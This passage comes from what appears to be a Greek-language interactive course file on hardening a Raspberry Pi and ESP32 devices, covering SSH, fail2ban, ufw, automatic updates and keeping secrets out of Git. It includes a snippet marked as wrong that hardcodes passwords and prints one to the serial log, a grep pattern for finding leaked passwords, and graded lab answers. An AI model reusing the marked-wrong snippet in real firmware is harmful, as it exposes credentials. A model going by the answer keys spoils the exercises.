          warn('Αν κάτι πάει στραβά και κλειδωθείς έξω: βάλε την κάρτα SD σε άλλο υπολογιστή, άνοιξε το rootfs και σβήσε το `/etc/ssh/sshd_config.d/01-hardening.conf`. Ή σύνδεσε οθόνη και πληκτρολόγιο στο Pi.'),
          cli('Lab: κλείδωμα του SSH', 'maria@raspberrypi:~ $', 'Raspberry Pi OS (προσομοίωση). Το κλειδί σου έχει ήδη μπει με ssh-copy-id.', [
            { task: 'Άνοιξε για επεξεργασία το drop-in `/etc/ssh/sshd_config.d/01-hardening.conf` με `nano`.', expect: '^sudo\\s+nano\\s+/etc/ssh/sshd_config\\.d/01-hardening\\.conf$', ans: 'sudo nano /etc/ssh/sshd_config.d/01-hardening.conf', out: '[ γράφεις PasswordAuthentication no, PermitRootLogin no, AllowUsers maria … και αποθηκεύεις με Ctrl+O, Ctrl+X ]' },
            { task: 'Έλεγξε τη σύνταξη της ρύθμισης του sshd.', expect: '^sudo\\s+sshd\\s+-t$', ans: 'sudo sshd -t', out: '' },
            { task: 'Δες την ενεργή τιμή του `passwordauthentication` (με `sshd -T` και `grep`).', expect: '^sudo\\s+sshd\\s+-T\\s*\\|\\s*grep\\s+(-i\\s+)?passwordauth', ans: 'sudo sshd -T | grep -i passwordauthentication', out: 'passwordauthentication no' },
            { task: 'Κάνε restart την υπηρεσία `ssh`.', expect: '^sudo\\s+systemctl\\s+restart\\s+ssh(d)?(\\.service)?$', ans: 'sudo systemctl restart ssh', out: '' },
            { task: 'Δες ότι τρέχει σωστά (status).', expect: '^(sudo\\s+)?systemctl\\s+status\\s+ssh', ans: 'systemctl status ssh', out: '● ssh.service - OpenBSD Secure Shell server\n     Active: active (running)\n     sshd[1234]: Server listening on 0.0.0.0 port 22.' },
          ], 'Τώρα μπαίνεις μόνο με κλειδί. Κράτα το παλιό session ανοιχτό μέχρι να δοκιμάσεις από νέο τερματικό!'),
          tip('Στο laptop φτιάξε `~/.ssh/config` με `Host pi` / `HostName raspberrypi.local` / `User maria` / `IdentityFile ~/.ssh/id_ed25519`. Μετά συνδέεσαι απλά με `ssh pi`.'),
          quiz('Έβαλες `PasswordAuthentication no` στο `/etc/ssh/sshd_config`, αλλά το `sshd -T` λέει `passwordauthentication yes`. Ποια είναι η πιθανότερη αιτία;',
            ['Το sshd αγνοεί αυτή την επιλογή', 'Ένα αρχείο στο `sshd_config.d/` (π.χ. `50-cloud-init.conf`) τη δηλώνει πρώτο, και στο OpenSSH κερδίζει η πρώτη τιμή', 'Πρέπει να κάνεις reboot', 'Η επιλογή λέγεται PasswordLogin'], 1,
            'Το `Include /etc/ssh/sshd_config.d/*.conf` είναι στην **αρχή** του κύριου αρχείου, και κερδίζει η **πρώτη** τιμή. Γι’ αυτό βάζουμε τις ρυθμίσεις σε drop-in με όνομα `01-…`.'),
          quiz('Ποιο αρχείο **δεν** πρέπει να φύγει ποτέ από το laptop σου;',
            ['`~/.ssh/id_ed25519.pub`', '`~/.ssh/id_ed25519`', '`~/.ssh/known_hosts`', '`~/.ssh/config`'], 1,
            'Το αρχείο χωρίς `.pub` είναι το **ιδιωτικό** κλειδί. Το `.pub` μπορεί να το δει όλος ο κόσμος.'),
        ],
      },
      {
        id: 'iot-2-3', title: 'fail2ban: μπλόκαρε όσους δοκιμάζουν κωδικούς', minutes: 13,
        goal: 'Να εγκαταστήσεις και να ρυθμίσεις το **fail2ban** σωστά στο Raspberry Pi OS Bookworm (με `backend = systemd`) και να ελέγχεις ποιες IP έχουν μπλοκαριστεί.',
        blocks: [
          text(
            'Ακόμα και με SSH μόνο με κλειδιά, τα bots θα συνεχίσουν να «χτυπάνε». Το **fail2ban** διαβάζει τα logs, βλέπει ποιες IP αποτυγχάνουν συνεχώς και τις **μπλοκάρει στο firewall** για κάποιο διάστημα. Έτσι:',
            '- Λιγότερος θόρυβος στα logs (βλέπεις τα πραγματικά προβλήματα).',
            '- Λιγότερο CPU στο μικρό Pi.',
            '- Προστασία και για άλλες υπηρεσίες με login (Mosquitto, web panels).'
          ),
          anim('iot-ssh-bruteforce', 'Τρεις αποτυχίες, ban 1 ώρας. Εσύ με το κλειδί σου περνάς κανονικά.'),
          code('bash', 'Εγκατάσταση', R`
sudo apt update
sudo apt install -y fail2ban python3-systemd
`, L(
            '- `python3-systemd`: χρειάζεται για να διαβάζει το fail2ban απευθείας το **journal** του systemd.',
            '- Στο Bookworm δεν υπάρχει πια `/var/log/auth.log` εξ ορισμού (δεν εγκαθίσταται rsyslog). Αν δεν ρυθμίσεις `backend = systemd`, το jail του sshd δεν ξεκινά.'
          )),
          code('text', '/etc/fail2ban/jail.local', R`
[DEFAULT]
# Μην μπλοκάρεις ποτέ τον εαυτό σου / το LAN σου
ignoreip = 127.0.0.1/8 ::1 192.168.1.0/24
bantime  = 1h
findtime = 10m
maxretry = 3
# Όσοι επιστρέφουν, τρώνε όλο και μεγαλύτερο ban (1h, 2h, 4h…)
bantime.increment = true
bantime.maxtime   = 1w
backend = systemd
# Αν χρησιμοποιείς ufw (επόμενο μάθημα), μπλόκαρε μέσω ufw:
banaction = ufw

[sshd]
enabled = true
port    = ssh
`, L(
            '- **Ποτέ** μην αλλάζεις το `jail.conf`: θα αντικατασταθεί σε κάποιο update. Οι ρυθμίσεις σου πάνε στο `jail.local`.',
            '- `ignoreip`: οι διευθύνσεις που δεν μπλοκάρονται ποτέ. Βάλε το δικό σου υποδίκτυο, για να μην κλειδωθείς αν μπερδέψεις το κλειδί.',
            '- `findtime = 10m` + `maxretry = 3`: 3 αποτυχίες μέσα σε 10 λεπτά → ban.',
            '- `bantime.increment`: κάθε επόμενο ban της ίδιας IP διπλασιάζεται, μέχρι 1 εβδομάδα.',
            '- `backend = systemd`: διαβάζει από το journal (απαραίτητο στο Bookworm).',
            '- `banaction = ufw`: τα bans γίνονται κανόνες ufw. Χωρίς ufw, άφησέ το στο default (iptables/nftables).'
          )),
          code('bash', 'Ενεργοποίηση και έλεγχος', R`
sudo systemctl enable --now fail2ban
sudo fail2ban-client status            # ποια jails τρέχουν
sudo fail2ban-client status sshd       # πόσες αποτυχίες, ποιες IP είναι banned

# Ξε-μπλόκαρε μια IP (π.χ. αν έκανες λάθος εσύ από 4G)
sudo fail2ban-client set sshd unbanip 203.0.113.66

# Δες τι «βλέπει» το fail2ban στα logs του sshd
sudo journalctl -u ssh --since "1 hour ago" | grep -Ei 'failed|invalid'
`, L(
            '- `enable --now`: ξεκινά τώρα **και** σε κάθε εκκίνηση.',
            '- `status sshd`: δείχνει `Currently failed`, `Total banned` και τη λίστα `Banned IP list`.',
            '- `unbanip`: χειροκίνητο ξεμπλοκάρισμα.',
            '- `journalctl -u ssh`: τα logs του SSH από το journal, το ίδιο που διαβάζει το fail2ban.'
          )),
          code('text', 'Μπόνους: jail για Mosquitto (/etc/fail2ban/jail.d/mosquitto.local)', R`
# Χρειάζεται και φίλτρο: /etc/fail2ban/filter.d/mosquitto-auth.conf
# Στο Mosquitto 2.x η αποτυχία γράφεται έτσι, σε ΔΥΟ γραμμές:
#   New connection from 192.168.1.66:50612 on port 8883.
#   Client attacker disconnected, not authorised.
# Η IP και η αποτυχία δεν είναι στην ίδια γραμμή, οπότε το φίλτρο θέλει
# multi-line regex (prefregex/maxlines). Πιο απλό & σίγουρο: πρόσβαση στο 8883
# μόνο από το IoT υποδίκτυο με firewall (Εν. 7).
[mosquitto]
enabled  = false
port     = 8883
filter   = mosquitto-auth
logpath  = /var/log/mosquitto/mosquitto.log
backend  = auto
maxretry = 5
`, L(
            '- Αυτό είναι σκόπιμα `enabled = false`: δείχνει πώς φτιάχνεται jail για **άλλη** υπηρεσία.',
            '- Κάθε jail χρειάζεται ένα **filter** (regex που βρίσκει την IP του επιτιθέμενου στο log) και μια **action** (π.χ. ban στο firewall).',
            '- Δοκίμαζεις ένα φίλτρο με: `fail2ban-regex /var/log/mosquitto/mosquitto.log /etc/fail2ban/filter.d/mosquitto-auth.conf`.'
          )),
          tip('Ανοίγεις SSH στο Internet; Καλύτερα **όχι**. Χρησιμοποίησε **WireGuard** ή **Tailscale** και άφησε το SSH ορατό μόνο μέσα από το VPN. Τότε το fail2ban είναι επιπλέον στρώμα, όχι η μόνη άμυνα.'),
          nw('alerts', 'Στην καρτέλα **Επιθέσεις** το NetWatch δείχνει brute force σε SSH/Telnet όταν τρέχει στο ίδιο δίκτυο, με κωδικό MITRE (T1110).'),
          quiz('Στο Raspberry Pi OS Bookworm το jail `sshd` δεν ξεκινά και το log λέει ότι δεν βρίσκει το `/var/log/auth.log`. Τι διορθώνεις;',
            ['Αλλάζεις τη θύρα του SSH', 'Βάζεις `backend = systemd` (και εγκαθιστάς `python3-systemd`)', 'Κάνεις `maxretry = 0`', 'Απενεργοποιείς το journal'], 1,
            'Το Bookworm γράφει τα logs στο **systemd journal** και όχι σε αρχεία κειμένου. Με `backend = systemd` το fail2ban τα διαβάζει από εκεί.'),
          quiz('Γιατί βάζουμε το LAN μας στο `ignoreip`;',
            ['Για να είναι πιο γρήγορο', 'Για να μην μπλοκάρουμε κατά λάθος τον εαυτό μας', 'Γιατί το LAN είναι πάντα ασφαλές', 'Γιατί αλλιώς δεν δουλεύει το ufw'], 1,
            'Αν μπερδέψεις κλειδιά ή χρήστη 3 φορές, θα έτρωγες ban από το ίδιο σου το Pi. Προσοχή όμως: αν μια συσκευή του LAN μολυνθεί, το fail2ban δεν θα την σταματήσει. Γι’ αυτό υπάρχει και το segmentation (Εν. 7).'),
        ],
      },
      {
        id: 'iot-2-4', title: 'Firewall με ufw', minutes: 14,
        goal: 'Να στήσεις **ufw** με πολιτική «όλα κλειστά εκτός από όσα χρειάζομαι», να περιορίσεις υπηρεσίες ανά υποδίκτυο και να μην κλειδωθείς έξω.',
        blocks: [
          text(
            'Το **ufw** (Uncomplicated Firewall) είναι ένα φιλικό εργαλείο πάνω από το netfilter του Linux (iptables/nftables). Η βασική ιδέα:',
            '- **Default deny incoming**: τίποτα δεν μπαίνει, εκτός αν το επιτρέψεις ρητά.',
            '- **Default allow outgoing**: το Pi μπορεί να βγει (για updates, NTP κ.λπ.).',
            '- Ανοίγεις **μόνο** ό,τι χρειάζεσαι και, όπου γίνεται, **μόνο από συγκεκριμένο υποδίκτυο**.'
          ),
          code('bash', 'Βασικό, ασφαλές setup', R`
sudo apt install -y ufw

# 1) Πολιτικές
sudo ufw default deny incoming
sudo ufw default allow outgoing

# 2) SSH ΠΡΩΤΑ (αλλιώς κλειδώνεσαι έξω!), μόνο από το LAN, με rate limit
sudo ufw limit from 192.168.1.0/24 to any port 22 proto tcp comment 'SSH από LAN'

# 3) MQTT over TLS μόνο από το LAN/IoT δίκτυο
sudo ufw allow from 192.168.1.0/24 to any port 8883 proto tcp comment 'MQTT TLS'

# 4) Ενεργοποίηση
sudo ufw enable

# 5) Έλεγχος με αρίθμηση κανόνων
sudo ufw status numbered
sudo ufw status verbose
`, L(
            '- `default deny incoming`: όλη η εισερχόμενη κίνηση κόβεται, εκτός από απαντήσεις σε συνδέσεις που ξεκίνησε το Pi (stateful).',
            '- `limit`: σαν `allow`, αλλά μπλοκάρει IP που ανοίγει **6+ συνδέσεις σε 30 δευτερόλεπτα**. Ένα μίνι fail2ban.',
            '- `from 192.168.1.0/24`: ο κανόνας ισχύει μόνο για το LAN σου. Από το Internet το 22 είναι κλειστό.',
            '- `comment`: θα ευχαριστήσεις τον εαυτό σου σε 6 μήνες.',
            '- `status numbered`: δείχνει τους κανόνες με αριθμό, για να σβήσεις π.χ. με `sudo ufw delete 3`.'
          )),
          code('bash', 'Χρήσιμες ακόμα εντολές', R`
# Δες τι ΑΚΟΥΕΙ στο Pi (ποιες θύρες χρειάζονται κανόνα)
sudo ss -tulpn

# Logging μπλοκαρισμένων πακέτων (σε low επίπεδο για να μη γεμίσει η κάρτα)
sudo ufw logging low
sudo journalctl -k | grep -i 'UFW BLOCK' | tail

# Σβήσε κανόνα με αριθμό
sudo ufw delete 3

# Απενεργοποίηση (αν κάτι πήγε στραβά και έχεις οθόνη/πληκτρολόγιο)
sudo ufw disable
`, L(
            '- `ss -tulpn`: TCP/UDP, listening, με process. Κάθε γραμμή είναι μια υπηρεσία που ίσως δεν χρειάζεσαι.',
            '- Τα logs του ufw πάνε στο kernel log, άρα στο journal (`journalctl -k`).',
            '- `UFW BLOCK` γραμμές με SRC από το Internet είναι φυσιολογικός «θόρυβος». Από το LAN σου όμως αξίζουν προσοχή.'
          )),
          cli('Lab: ufw από το μηδέν', 'maria@raspberrypi:~ $', 'Το Pi έχει IP 192.168.1.50. Θέλουμε SSH και MQTT/TLS μόνο από το 192.168.1.0/24.', [
            { task: 'Όρισε default πολιτική: άρνηση για εισερχόμενα.', expect: '^sudo\\s+ufw\\s+default\\s+deny\\s+(incoming|in)$', ans: 'sudo ufw default deny incoming', out: "Default incoming policy changed to 'deny'\n(be sure to update your rules accordingly)" },
            { task: 'Όρισε default πολιτική: επιτρέπονται τα εξερχόμενα.', expect: '^sudo\\s+ufw\\s+default\\s+allow\\s+(outgoing|out)$', ans: 'sudo ufw default allow outgoing', out: "Default outgoing policy changed to 'allow'" },
            { task: 'Επίτρεψε με **limit** SSH (22/tcp) μόνο από 192.168.1.0/24.', expect: '^sudo\\s+ufw\\s+limit\\s+from\\s+192\\.168\\.1\\.0/24\\s+to\\s+any\\s+port\\s+22(\\s+proto\\s+tcp)?', ans: 'sudo ufw limit from 192.168.1.0/24 to any port 22 proto tcp', out: 'Rule added' },
            { task: 'Επίτρεψε 8883/tcp μόνο από 192.168.1.0/24.', expect: '^sudo\\s+ufw\\s+allow\\s+from\\s+192\\.168\\.1\\.0/24\\s+to\\s+any\\s+port\\s+8883(\\s+proto\\s+tcp)?', ans: 'sudo ufw allow from 192.168.1.0/24 to any port 8883 proto tcp', out: 'Rule added' },
            { task: 'Ενεργοποίησε το firewall.', expect: '^sudo\\s+ufw\\s+(--force\\s+)?enable$', ans: 'sudo ufw enable', out: 'Command may disrupt existing ssh connections. Proceed with operation (y|n)? y\nFirewall is active and enabled on system startup' },
            { task: 'Δες τους κανόνες με αρίθμηση.', expect: '^sudo\\s+ufw\\s+status\\s+numbered$', ans: 'sudo ufw status numbered', out: 'Status: active\n\n     To                         Action      From\n     --                         ------      ----\n[ 1] 22/tcp                     LIMIT IN    192.168.1.0/24\n[ 2] 8883/tcp                   ALLOW IN    192.168.1.0/24' },
          ], 'Το Pi δέχεται μόνο SSH και MQTT/TLS, και μόνο από το LAN.'),
          warn('**Docker + ufw:** το Docker γράφει δικούς του κανόνες iptables και **παρακάμπτει** το ufw για ports που κάνεις publish (`-p 1883:1883`). Αν τρέχεις Mosquitto σε container, κάνε bind σε συγκεκριμένη IP (`-p 127.0.0.1:1883:1883`) ή δες τη λύση `ufw-docker`.'),
          nw('lan', 'Η καρτέλα **LAN** του NetWatch δείχνει ποιες συσκευές μιλάνε με το Pi σου. Αν μετά το ufw βλέπεις ακόμα συνδέσεις σε θύρες που δεν άνοιξες, κάτι παρακάμπτει το firewall (π.χ. Docker).'),
          quiz('Ποια σειρά εντολών είναι **επικίνδυνη** σε Pi που διαχειρίζεσαι μέσω SSH;',
            ['`ufw allow 22` → `ufw enable`', '`ufw default deny incoming` → `ufw enable` → `ufw allow 22`', '`ufw limit from 192.168.1.0/24 to any port 22` → `ufw enable`', '`ufw status` → `ufw enable`'], 1,
            'Αν ενεργοποιήσεις το firewall με deny **πριν** επιτρέψεις το 22, η επόμενη σύνδεση SSH θα κοπεί (και ίσως και η τρέχουσα). Πάντα: πρώτα allow SSH, μετά enable.'),
          quiz('Τι κάνει το `ufw limit` σε σχέση με το `ufw allow`;',
            ['Επιτρέπει μόνο 1 χρήστη', 'Επιτρέπει, αλλά μπλοκάρει IP με πολλές νέες συνδέσεις σε σύντομο χρόνο', 'Περιορίζει το bandwidth', 'Επιτρέπει μόνο IPv4'], 1,
            'Το `limit` κόβει μια IP που κάνει 6 ή περισσότερες νέες συνδέσεις μέσα σε 30 δευτερόλεπτα. Ιδανικό για SSH.'),
        ],
      },
      {
        id: 'iot-2-5', title: 'Αυτόματες ενημερώσεις και λιγότερες υπηρεσίες', minutes: 14,
        goal: 'Να ρυθμίσεις **unattended-upgrades** για security updates και να απενεργοποιήσεις υπηρεσίες και hardware (Bluetooth, avahi, CUPS) που δεν χρησιμοποιείς.',
        blocks: [
          text(
            'Οι περισσότερες επιθέσεις χρησιμοποιούν **γνωστές** ευπάθειες, για τις οποίες υπάρχει ήδη patch. Ένα Pi που μένει χρόνια χωρίς `apt upgrade` είναι εύκολος στόχος.',
            '',
            'Το **unattended-upgrades** εγκαθιστά αυτόματα (κάθε μέρα) τις ενημερώσεις ασφαλείας. Για συσκευή που τρέχει μόνη της 24/7, είναι σχεδόν υποχρεωτικό.'
          ),
          code('bash', 'Εγκατάσταση και ενεργοποίηση', R`
sudo apt update && sudo apt full-upgrade -y
sudo apt install -y unattended-upgrades apt-listchanges

# Ενεργοποίηση (δημιουργεί το /etc/apt/apt.conf.d/20auto-upgrades)
sudo dpkg-reconfigure -plow unattended-upgrades

# Δες ποιες πηγές (origin/label) έχει το σύστημά σου
apt-cache policy | grep -E 'o=|release' | sort -u
`, L(
            '- `full-upgrade`: πρώτα φέρε το σύστημα στο σήμερα.',
            '- `dpkg-reconfigure -plow`: σε ρωτάει «Automatically download and install stable updates?» → Yes.',
            '- `apt-cache policy`: δείχνει τα `o=` (origin) και `l=` (label) κάθε repository. Τα χρειάζεσαι για να πεις στο unattended-upgrades **ποια** repos να ενημερώνει.'
          )),
          code('text', '/etc/apt/apt.conf.d/52unattended-upgrades-local', R`
// Ποια repos ενημερώνονται αυτόματα.
// Raspberry Pi OS 64-bit: Debian (security + updates) + archive.raspberrypi.com
// Άλλαξε το "bookworm" αν το /etc/os-release γράφει άλλο codename (π.χ. trixie).
Unattended-Upgrade::Origins-Pattern {
        "origin=Debian,codename=bookworm,label=Debian-Security";
        "origin=Debian,codename=bookworm-security,label=Debian-Security";
        "origin=Debian,codename=bookworm-updates";
        "origin=Raspberry Pi Foundation,codename=bookworm";
};

// Καθάρισε πακέτα που δεν χρειάζονται πια
Unattended-Upgrade::Remove-Unused-Dependencies "true";

// Αυτόματο reboot αν το χρειάζεται ένα update (π.χ. kernel), στις 04:00
Unattended-Upgrade::Automatic-Reboot "true";
Unattended-Upgrade::Automatic-Reboot-Time "04:00";
`, L(
            '- Τα αρχεία στο `apt.conf.d` διαβάζονται αλφαβητικά, άρα το `52-…` εφαρμόζεται **μετά** το default `50unattended-upgrades` και δεν το πειράζεις.',
            '- `Origins-Pattern`: κάθε γραμμή περιγράφει ένα repo με τα `origin`, `codename`, `label` που είδες στο `apt-cache policy`.',
            '- Η γραμμή `Raspberry Pi Foundation` καλύπτει kernel/firmware/εργαλεία του Pi από το `archive.raspberrypi.com`.',
            '- `Automatic-Reboot`: τα kernel updates χρειάζονται reboot για να ισχύσουν. Για αισθητήρα στις 04:00 είναι συνήθως ΟΚ.'
          )),
          code('bash', 'Δοκιμή χωρίς να εγκαταστήσει τίποτα', R`
sudo unattended-upgrade --dry-run --debug 2>&1 | grep -Ei 'allowed origins|packages that will be upgraded|no packages'
# Ιστορικό: τι εγκαταστάθηκε και πότε
less /var/log/unattended-upgrades/unattended-upgrades.log
`, L(
            '- `--dry-run --debug`: δείχνει ποια origins επιτρέπονται και τι **θα** αναβάθμιζε.',
            '- Αν η λίστα `Allowed origins` δεν περιέχει τα repos σου, κάτι δεν ταιριάζει στο pattern.'
          )),
          text(
            '### Λιγότερες υπηρεσίες = μικρότερο attack surface',
            'Κάθε υπηρεσία που τρέχει είναι κώδικας που μπορεί να έχει bug. Σε ένα headless Pi που κάνει μόνο broker/αισθητήρα, συνήθως **δεν** χρειάζεσαι:'
          ),
          table(['Υπηρεσία', 'Τι κάνει', 'Πότε να τη σβήσεις'], [
            ['`avahi-daemon`', 'mDNS (`raspberrypi.local`)', 'Αν έχεις σταθερή IP ή DNS στον router (θα χάσεις το `.local`)'],
            ['`bluetooth`, `hciuart`', 'Bluetooth', 'Αν δεν χρησιμοποιείς BLE'],
            ['`cups`, `cups-browsed`', 'Εκτυπωτές', 'Σχεδόν πάντα σε headless Pi'],
            ['`ModemManager`', 'Modems 3G/4G', 'Αν δεν έχεις USB modem'],
            ['`triggerhappy`', 'Hotkeys', 'Σε headless Pi'],
            ['`rpcbind`, `nfs-…`', 'NFS', 'Αν δεν κάνεις mount NFS'],
          ]),
          code('bash', 'Βρες και σβήσε ό,τι δεν χρειάζεσαι', R`
# Τι τρέχει και τι ακούει στο δίκτυο;
systemctl list-units --type=service --state=running
sudo ss -tulpn

# Απενεργοποίηση (stop τώρα + όχι στην εκκίνηση)
sudo systemctl disable --now cups.service cups-browsed.service
sudo systemctl disable --now bluetooth.service hciuart.service
sudo systemctl disable --now ModemManager.service

# Bluetooth εντελώς off σε επίπεδο hardware (Pi 3/4/5)
echo 'dtoverlay=disable-bt' | sudo tee -a /boot/firmware/config.txt

# Wi‑Fi off αν το Pi είναι μόνο με καλώδιο (χρήσιμο για broker)
echo 'dtoverlay=disable-wifi' | sudo tee -a /boot/firmware/config.txt
sudo reboot
`, L(
            '- `list-units … running`: όλες οι υπηρεσίες που τρέχουν αυτή τη στιγμή.',
            '- `disable --now`: σταματά και αφαιρεί από την εκκίνηση. Αν τη χρειαστείς ξανά: `enable --now`.',
            '- `dtoverlay=disable-bt`: το Bluetooth δεν εμφανίζεται καν στο σύστημα (ούτε μπορεί να ενεργοποιηθεί από λογισμικό).',
            '- Στο Bookworm το αρχείο είναι `/boot/firmware/config.txt` (στα παλιότερα: `/boot/config.txt`).',
            '- `disable-wifi`: **μην** το κάνεις αν το Pi είναι συνδεδεμένο μόνο με Wi‑Fi!'
          )),
          tip('Τρέξε ξανά `sudo ss -tulpn` μετά. Ιδανικά βλέπεις μόνο `sshd` (22), `mosquitto` (8883, και 1883 μόνο σε `127.0.0.1`) και ό,τι άλλο **εσύ** εγκατέστησες.'),
          quiz('Γιατί φτιάχνουμε δικό μας αρχείο `52unattended-upgrades-local` αντί να αλλάξουμε το `50unattended-upgrades`;',
            ['Γιατί το 50 είναι read-only', 'Για να μην χαθούν/συγκρουστούν οι αλλαγές μας όταν το πακέτο ενημερώσει το δικό του αρχείο', 'Γιατί το 52 εκτελείται πιο γρήγορα', 'Δεν υπάρχει λόγος'], 1,
            'Τα αρχεία πακέτων μπορεί να αντικατασταθούν σε update. Τα δικά σου drop-in αρχεία μένουν. Ίδια λογική με `jail.local` και `sshd_config.d/`.'),
          quiz('Η εντολή `sudo ss -tulpn` δείχνει `0.0.0.0:631 cupsd`. Τι σημαίνει;',
            ['Το Pi εκτυπώνει κάτι', 'Η υπηρεσία εκτυπωτών CUPS ακούει σε όλες τις διεπαφές: αν δεν τη χρειάζεσαι, απενεργοποίησέ την', 'Είναι το SSH', 'Είναι φυσιολογικό και απαραίτητο'], 1,
            'Το `0.0.0.0` σημαίνει «σε όλες τις διεπαφές». Υπηρεσία που δεν χρειάζεσαι = περιττό attack surface.'),
        ],
      },
    ],
  });

  // ====================================================================
  // MODULE 3 — ESP32 βασικά και ασφαλές Wi‑Fi
  // ====================================================================
  M.push({
    id: 'iot-3', order: 3, title: 'ESP32: μυστικά, ασφαλές Wi‑Fi και provisioning',
    desc: 'Κωδικοί εκτός κώδικα (secrets.h, .gitignore), WPA2/WPA3, provisioning με Preferences, Arduino C++ και MicroPython.',
    lessons: [
      {
        id: 'iot-3-1', title: 'Ποτέ κωδικοί μέσα στον κώδικα: secrets.h και .gitignore', minutes: 15,
        goal: 'Να βγάλεις κωδικούς και κλειδιά από τον κώδικα (Arduino και MicroPython), να μην ανέβουν ποτέ στο Git, και να γράφεις callbacks που δεν «σκάνε» με κακά δεδομένα.',
        blocks: [
          text(
            'Το πιο συχνό λάθος σε projects με ESP32: ο κωδικός του Wi‑Fi και του MQTT μέσα στο `.ino`. Μετά το project ανεβαίνει στο GitHub «για να το δει ένας φίλος», και μέσα σε λίγα λεπτά bots που σαρώνουν το GitHub έχουν βρει τον κωδικό σου.',
            '',
            'Ο κανόνας: **ο κώδικας είναι δημόσιος, τα μυστικά όχι.** Χωρίζουμε τα δύο σε διαφορετικά αρχεία.'
          ),
          code('cpp', '❌ ΛΑΘΟΣ: main.ino με κωδικούς μέσα', R`
#include <WiFi.h>

const char* ssid     = "HomeWiFi";
const char* password = "MyS3cretPass!";        // ❌ θα καταλήξει στο GitHub
const char* mqttPass = "Kalimera2024";         // ❌ και αυτός

void setup() {
  Serial.begin(115200);
  WiFi.begin(ssid, password);
  Serial.printf("Συνδέομαι με κωδικό %s\n", password);   // ❌ και στο Serial log!
}
void loop() {}
`, L(
            '- Οι κωδικοί είναι **σε κάθε αντίγραφο** του κώδικα: GitHub, Discord, screenshot, backup.',
            '- Το `Serial.printf` με τον κωδικό σημαίνει ότι όποιος συνδέσει USB στη συσκευή τον βλέπει.',
            '- Αν αλλάξεις κωδικό Wi‑Fi, πρέπει να αλλάξεις τον κώδικα.'
          )),
          code('cpp', '✅ secrets.h (ΔΕΝ ανεβαίνει ποτέ στο Git)', R`
#pragma once
// Αντίγραψε το secrets.example.h σε secrets.h και συμπλήρωσε.
#define WIFI_SSID  "HomeWiFi"
#define WIFI_PASS  "MyS3cretPass!"
#define MQTT_HOST  "pi-broker.local"
#define MQTT_USER  "sensor01"
#define MQTT_PASS  "8f2K-vQ9x-Lm3p-Tz7w"
`, L(
            '- `#pragma once`: το αρχείο γίνεται include μόνο μία φορά, ακόμα κι αν το ζητήσουν πολλά .cpp.',
            '- Κάθε συσκευή παίρνει **δικό της** `MQTT_USER`/`MQTT_PASS`. Αν κλαπεί μία, ανακαλείς μόνο αυτήν.',
            '- Στο repo ανεβάζεις ένα `secrets.example.h` με τα ίδια `#define` και τιμές `"CHANGE_ME"`, για να ξέρει κάποιος τι να συμπληρώσει.'
          )),
          code('cpp', '✅ main.ino', R`
#include <WiFi.h>
#include "secrets.h"          // τα μυστικά έρχονται από εδώ

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_STA);
  WiFi.begin(WIFI_SSID, WIFI_PASS);
  Serial.printf("Συνδέομαι στο %s...\n", WIFI_SSID);   // SSID ναι, κωδικό ΟΧΙ
  while (WiFi.status() != WL_CONNECTED) {
    delay(250);
    Serial.print('.');
  }
  Serial.printf("\nOK, IP=%s\n", WiFi.localIP().toString().c_str());
}

void loop() {}
`, L(
            '- `#include "secrets.h"` με εισαγωγικά: ψάχνει πρώτα στον φάκελο του sketch.',
            '- Στο Arduino IDE, το `secrets.h` πρέπει να είναι **στον ίδιο φάκελο** με το `.ino` (εμφανίζεται ως καρτέλα).',
            '- Τυπώνουμε μόνο το SSID. Ποτέ κωδικούς, tokens ή κλειδιά σε logs.'
          )),
          code('text', '.gitignore (στη ρίζα του repo)', R`
# Μυστικά: ΠΟΤΕ στο Git
secrets.h
secrets.py
wifi.json
*.pem
*.key
*.der
ca.srl

# Build artifacts
.pio/
build/
*.bin
`, L(
            '- `secrets.h` / `secrets.py`: τα αρχεία με κωδικούς για Arduino και MicroPython.',
            '- `*.pem`, `*.key`: ιδιωτικά κλειδιά (CA, server, signing key για Secure Boot). Αυτά είναι **ακόμα πιο** πολύτιμα από τον κωδικό Wi‑Fi.',
            '- `.pio/`, `build/`, `*.bin`: τα compiled binaries **περιέχουν** τους κωδικούς σε απλό κείμενο!',
            '- Το `ca.crt` (δημόσιο πιστοποιητικό της CA) **δεν** είναι μυστικό. Μπορεί να ανέβει.'
          )),
          code('bash', 'Έλεγχος πριν το push', R`
# Είναι όντως ignored;
git check-ignore -v secrets.h

# Μήπως έχει ήδη γίνει commit παλιότερα;
git log --all --oneline -- secrets.h
git grep -n -I -E 'WIFI_PASS|password|MQTT_PASS' $(git rev-list --all) | head

# Αν είχε μπει ήδη: σταμάτα να το παρακολουθείς (το αρχείο μένει τοπικά)
git rm --cached secrets.h
git commit -m "Remove secrets from repo"
`, L(
            '- `check-ignore -v`: λέει ποια γραμμή του `.gitignore` πιάνει το αρχείο.',
            '- `git log --all -- secrets.h`: αν δείξει commits, το αρχείο υπάρχει στο **ιστορικό**.',
            '- `git grep … $(git rev-list --all)`: ψάχνει σε όλες τις εκδόσεις όλων των commits.',
            '- `git rm --cached`: σταματά να το παρακολουθεί, χωρίς να σβήσει το τοπικό αρχείο.',
            '- **Σημαντικό:** αν ο κωδικός ανέβηκε ποτέ σε δημόσιο repo, θεώρησέ τον **καμένο** και άλλαξέ τον. Το ξαναγράψιμο του ιστορικού δεν αρκεί (υπάρχουν forks, caches, bots).'
          )),
          text('Στο **PlatformIO** μπορείς να περάσεις τα μυστικά από μεταβλητές περιβάλλοντος, χωρίς κανένα αρχείο:'),
          code('text', 'platformio.ini', '[env:esp32dev]\nplatform = espressif32\nboard = esp32dev\nframework = arduino\nlib_deps = knolleary/PubSubClient@^2.8\n; Οι τιμές έρχονται από το περιβάλλον: export WIFI_PASS=\'...\'\nbuild_flags =\n  -DWIFI_SSID=\\"${sysenv.WIFI_SSID}\\"\n  -DWIFI_PASS=\\"${sysenv.WIFI_PASS}\\"', L(
            '- `${sysenv.X}`: το PlatformIO διαβάζει τη μεταβλητή περιβάλλοντος `X` την ώρα του build.',
            '- Τα `\\"` χρειάζονται για να γίνει η τιμή string literal στη C++.',
            '- Χρήσιμο σε CI (GitHub Actions secrets).'
          )),
          text('### Το ίδιο σε MicroPython'),
          code('micropython', 'secrets.py (στη συσκευή, όχι στο Git)', R`
WIFI_SSID = "HomeWiFi"
WIFI_PASS = "MyS3cretPass!"
MQTT_HOST = "pi-broker.local"
MQTT_USER = "sensor02"
MQTT_PASS = "Q7r2-Wd9k-Pz4n-Yx1m"
`, L(
